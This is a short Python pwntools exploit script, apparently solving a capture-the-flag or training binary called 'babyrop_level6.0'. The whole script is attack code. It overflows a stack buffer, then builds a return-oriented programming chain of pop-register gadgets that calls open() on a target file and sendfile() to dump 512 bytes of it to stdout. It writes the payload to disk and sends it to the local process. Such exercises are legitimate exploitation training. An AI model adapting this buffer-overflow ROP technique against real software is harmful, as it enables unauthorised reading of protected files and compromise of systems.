from pwn import *

payload = b""
payload += b"A" * 32 # buffer
payload += b"B" * 8 # saved_rbp

payload += p64(0x402200) # pop rdi ; ret
payload += p64(0x403386) # -> '!' filename

payload += p64(0x402210) # pop rsi ; ret
payload += p64(0x0) # 0x0

payload += p64(0x4021d5) # force_import() so that open() works

payload += p64(0x402200) # pop rdi ; ret
payload += p64(0x1) # outfd = stdout
payload += p64(0x402210) # pop rsi ; ret
payload += p64(0x3) # infd = 3
payload += p64(0x402208) # pop rdx ; ret
payload += p64(0x0) # offset* = 0
payload += p64(0x402218) # pop rcx ; ret
payload += p64(512) # size = 512 bytes

payload += p64(0x4021ec) # force_import() but from sendfile()

with open("input", "wb") as f:
    f.write(payload)

p = process("./babyrop_level6.0")

p.sendline(payload)

print(p.recvall())
